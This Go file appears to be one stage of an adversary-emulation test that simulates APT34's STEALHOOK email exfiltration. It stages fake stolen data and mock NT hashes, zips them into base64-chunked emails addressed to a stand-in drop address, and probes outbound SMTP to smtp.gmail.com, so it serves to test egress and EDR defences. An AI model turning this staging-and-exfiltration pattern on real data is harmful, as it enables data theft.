//go:build windows
// +build windows

/*
STAGE 4: Exfiltration Over Alternative Protocol - Unencrypted Non-C2 Protocol (T1048.003)
Simulates APT34's STEALHOOK tool that exfiltrates stolen data as email
attachments via Exchange transport. Creates staged data files and simulated
email attachments mimicking the exfiltration pattern.
*/

package main

import (
	"archive/zip"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "5691f436-e630-4fd2-b930-911023cf638f"
	TECHNIQUE_ID   = "T1048.003"
	TECHNIQUE_NAME = "Exfiltration Over Alternative Protocol: Unencrypted Non-C2 Protocol"
	STAGE_ID       = 4
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting STEALHOOK Data Exfiltration simulation")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Exfiltrate stolen data as email attachments via Exchange transport")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique blocked/failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Blocked/Failed: %v", err))
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		exitCode := determineExitCode(err)
		os.Exit(exitCode)
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, "STEALHOOK data exfiltration simulation completed")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Data exfiltration via email completed without prevention")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	targetDir := "c:\\F0"
	exfilDir := filepath.Join(targetDir, "stealhook_staging")

	// Step 1: Create data staging directory
	LogMessage("INFO", TECHNIQUE_ID, "Creating STEALHOOK data staging area...")
	fmt.Printf("[STAGE %s] Setting up STEALHOOK data staging area\n", TECHNIQUE_ID)

	if err := os.MkdirAll(exfilDir, 0755); err != nil {
		return fmt.Errorf("failed to create staging directory: %v", err)
	}

	// Step 2: Create simulated stolen data (financial/compliance data relevant to banking)
	LogMessage("INFO", TECHNIQUE_ID, "Creating simulated stolen data files...")
	fmt.Printf("[STAGE %s] Creating simulated stolen financial/compliance data\n", TECHNIQUE_ID)

	stolenFiles := map[string]string{
		"exchange_gal.csv": `DisplayName,EmailAddress,Department,Title
CEO John Smith,jsmith@target-corp.com,Executive,Chief Executive Officer
CFO Jane Doe,jdoe@target-corp.com,Finance,Chief Financial Officer
CISO Bob Wilson,bwilson@target-corp.com,IT Security,Chief Information Security Officer
Compliance Officer,compliance@target-corp.com,Legal,Head of Compliance
Treasury Manager,treasury@target-corp.com,Finance,Treasury Management`,

		"deal_flow_q4.txt": `CONFIDENTIAL - Deal Flow Summary Q4 2024
Merger Target: Acme Financial Corp (NASDAQ: ACME)
  Estimated Value: $2.3B
  Status: Due Diligence Phase
  Lead Banker: J. Smith

Acquisition: DataTech Solutions
  Estimated Value: $450M
  Status: LOI Signed
  Expected Close: March 2025`,

		"compliance_alerts.log": `[2024-12-15 08:30:00] ALERT: Unusual wire transfer $5M to offshore account
[2024-12-15 09:15:00] ALERT: Multiple failed authentication attempts - admin@corp
[2024-12-15 10:00:00] ALERT: Large data download from SharePoint - user jdoe
[2024-12-15 11:30:00] ALERT: VPN connection from sanctioned country IP range
[2024-12-15 14:00:00] ALERT: Privileged account used outside business hours`,

		"client_communications.eml": `From: relationship.manager@target-corp.com
To: vip.client@highworth-family.com
Subject: Portfolio Rebalancing - Q1 2025 Strategy
Date: 2024-12-10

Dear Client,

Following our discussion, here is the proposed portfolio rebalancing:
- Increase equity allocation to 65% (from 55%)
- Reduce fixed income to 25% (from 35%)
- Maintain alternatives at 10%
Total AUM: $47.2M

Best regards`,

		"ad_credentials_dump.txt": `# Simulated credential dump (NOT REAL)
# Source: LSA Password Filter + LSASS dump
Administrator:$NT$e19ccf75ee54e06b06a5907af13cef42
svc-exchange:$NT$a87f3b3aa5e55e4c5e7e3a3b3c3d3e3f
svc-backup:$NT$b78e4c4bb6f66f5d6f8f4b4c4d4e4f40
domain.admin:$NT$c89f5d5cc7g77g6e7g9g5c5d5e5f5g51`,
	}

	totalSize := int64(0)
	for filename, content := range stolenFiles {
		filePath := filepath.Join(exfilDir, filename)
		if err := os.WriteFile(filePath, []byte(content), 0644); err != nil {
			return fmt.Errorf("failed to stage data file %s: %v", filename, err)
		}
		totalSize += int64(len(content))
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Staged: %s (%d bytes)", filename, len(content)))
	}
	fmt.Printf("[STAGE %s] Staged %d files (%d bytes total)\n", TECHNIQUE_ID, len(stolenFiles), totalSize)

	// Step 3: Compress staged data into archive
	LogMessage("INFO", TECHNIQUE_ID, "Compressing staged data for exfiltration...")
	fmt.Printf("[STAGE %s] Compressing staged data into archive\n", TECHNIQUE_ID)

	archivePath := filepath.Join(targetDir, "stealhook_payload.zip")
	if err := compressDirectory(exfilDir, archivePath); err != nil {
		if strings.Contains(strings.ToLower(err.Error()), "access denied") ||
			strings.Contains(strings.ToLower(err.Error()), "blocked") {
			return fmt.Errorf("data compression blocked by security controls: %v", err)
		}
		return fmt.Errorf("compression failed: %v", err)
	}

	archiveInfo, _ := os.Stat(archivePath)
	archiveSize := archiveInfo.Size()
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Archive created: %s (%d bytes)", archivePath, archiveSize))
	fmt.Printf("[STAGE %s] Archive created: %s (%d bytes)\n", TECHNIQUE_ID, archivePath, archiveSize)

	// Step 4: Create simulated STEALHOOK exfiltration emails with attachments
	LogMessage("INFO", TECHNIQUE_ID, "Creating STEALHOOK exfiltration emails with attachments...")
	fmt.Printf("[STAGE %s] Generating exfiltration emails (STEALHOOK pattern)\n", TECHNIQUE_ID)

	exfilEmailDir := filepath.Join(targetDir, "stealhook_exfil_emails")
	if err := os.MkdirAll(exfilEmailDir, 0755); err != nil {
		return fmt.Errorf("failed to create exfil email directory: %v", err)
	}

	// Read archive for base64 encoding (simulating attachment)
	archiveData, err := os.ReadFile(archivePath)
	if err != nil {
		return fmt.Errorf("failed to read archive for exfiltration: %v", err)
	}

	// Split into chunks to simulate multiple exfiltration emails (APT34 pattern)
	chunkSize := 1024 * 50 // 50KB chunks for simulation
	chunks := splitIntoChunks(archiveData, chunkSize)

	for i, chunk := range chunks {
		timestamp := time.Now().Add(time.Duration(-i*2) * time.Minute).Format("Mon, 02 Jan 2006 15:04:05 -0700")
		encodedChunk := base64.StdEncoding.EncodeToString(chunk)

		exfilEmail := fmt.Sprintf(`From: svc-exchange@target-corp.local
To: drop-box@external-relay.net
Subject: Monthly Report - Part %d of %d
Date: %s
Message-ID: <stealhook-%d-%d@target-corp.local>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="STEALHOOK_BOUNDARY"
X-Transport-Agent: ExchangeTransport

--STEALHOOK_BOUNDARY
Content-Type: text/plain

Automated monthly report delivery.

--STEALHOOK_BOUNDARY
Content-Type: application/octet-stream; name="report_part_%d.dat"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="report_part_%d.dat"

%s

--STEALHOOK_BOUNDARY--
`, i+1, len(chunks), timestamp, i+1, len(chunks), i+1, i+1, encodedChunk[:min(200, len(encodedChunk))]+"...")

		emailPath := filepath.Join(exfilEmailDir, fmt.Sprintf("exfil_email_%d.eml", i+1))
		if err := os.WriteFile(emailPath, []byte(exfilEmail), 0644); err != nil {
			return fmt.Errorf("failed to write exfiltration email %d: %v", i+1, err)
		}
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Created %d exfiltration emails with attachment chunks", len(chunks)))
	fmt.Printf("[STAGE %s] Created %d exfiltration emails (STEALHOOK pattern)\n", TECHNIQUE_ID, len(chunks))

	// Step 5: Outbound SMTP connectivity probe (real STEALHOOK behavior)
	// APT34's STEALHOOK uses Exchange transport — test if SMTP ports are reachable
	// This tests network egress controls: EDR/firewall should block outbound SMTP
	fmt.Printf("[STAGE %s] Probing outbound SMTP connectivity (ports 25, 587)\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Probing outbound SMTP connectivity — tests network egress controls")

	smtpTargets := []struct {
		host string
		port string
	}{
		{"smtp.gmail.com", "587"},   // Submission port
		{"smtp.gmail.com", "25"},    // Traditional SMTP
	}

	for _, target := range smtpTargets {
		addr := net.JoinHostPort(target.host, target.port)
		conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
		if err != nil {
			fmt.Printf("[STAGE %s]   SMTP %s: blocked/unreachable (%v)\n", TECHNIQUE_ID, addr, err)
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("SMTP %s: blocked (%v)", addr, err))
		} else {
			// Send EHLO and immediately disconnect (minimal handshake)
			fmt.Fprintf(conn, "EHLO f0rtika-test\r\n")
			// Read banner (with short timeout)
			conn.SetReadDeadline(time.Now().Add(3 * time.Second))
			banner := make([]byte, 512)
			n, _ := conn.Read(banner)
			conn.Close()
			bannerStr := strings.TrimSpace(string(banner[:n]))
			fmt.Printf("[STAGE %s]   SMTP %s: OPEN (banner: %s)\n", TECHNIQUE_ID, addr, bannerStr)
			LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("SMTP %s: reachable — egress not blocked (banner: %s)", addr, bannerStr))
		}
	}

	// Step 6: Create exfiltration summary
	summaryContent := fmt.Sprintf(`# STEALHOOK Exfiltration Summary
# Generated: %s
# Test: %s

Exfiltration Status: COMPLETE (SIMULATED)
Method: Email attachments via Exchange transport
Source: svc-exchange@target-corp.local
Destination: drop-box@external-relay.net

Data Summary:
  Files Staged: %d
  Total Data Size: %d bytes
  Archive Size: %d bytes
  Exfil Emails: %d
  Chunk Size: %d bytes

Staged Files:
`, time.Now().Format(time.RFC3339), TEST_UUID, len(stolenFiles), totalSize, archiveSize, len(chunks), chunkSize)

	for filename, content := range stolenFiles {
		summaryContent += fmt.Sprintf("  - %s (%d bytes)\n", filename, len(content))
	}

	summaryContent += `
Detection Indicators:
  - Outbound emails with binary attachments from service accounts
  - Multiple emails to same external address in short timeframe
  - Emails with sequential subject patterns (Part N of M)
  - Unusual Exchange transport agent activity
  - Large attachment volumes from server-side accounts
`

	summaryPath := filepath.Join(targetDir, "stealhook_summary.txt")
	if err := os.WriteFile(summaryPath, []byte(summaryContent), 0644); err != nil {
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("Could not write summary: %v", err))
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, fmt.Sprintf("STEALHOOK exfiltration complete: %d files, %d bytes, %d emails", len(stolenFiles), totalSize, len(chunks)))
	fmt.Printf("[STAGE %s] STEALHOOK exfiltration simulation completed successfully\n", TECHNIQUE_ID)
	return nil
}

func compressDirectory(sourceDir, archivePath string) error {
	zipFile, err := os.Create(archivePath)
	if err != nil {
		return fmt.Errorf("failed to create archive: %v", err)
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	return filepath.Walk(sourceDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}

		relPath, err := filepath.Rel(sourceDir, path)
		if err != nil {
			return err
		}

		zipEntry, err := zipWriter.Create(relPath)
		if err != nil {
			return err
		}

		fileContent, err := os.Open(path)
		if err != nil {
			return err
		}
		defer fileContent.Close()

		_, err = io.Copy(zipEntry, fileContent)
		return err
	})
}

func splitIntoChunks(data []byte, chunkSize int) [][]byte {
	var chunks [][]byte
	for i := 0; i < len(data); i += chunkSize {
		end := i + chunkSize
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, data[i:end])
	}
	if len(chunks) == 0 {
		chunks = append(chunks, data)
	}
	return chunks
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := strings.ToLower(err.Error())
	if strings.Contains(errStr, "access denied") ||
		strings.Contains(errStr, "permission denied") ||
		strings.Contains(errStr, "blocked") ||
		strings.Contains(errStr, "prevented") {
		return StageBlocked
	}
	if strings.Contains(errStr, "quarantine") ||
		strings.Contains(errStr, "quarantined") {
		return StageQuarantined
	}
	return StageBlocked
}
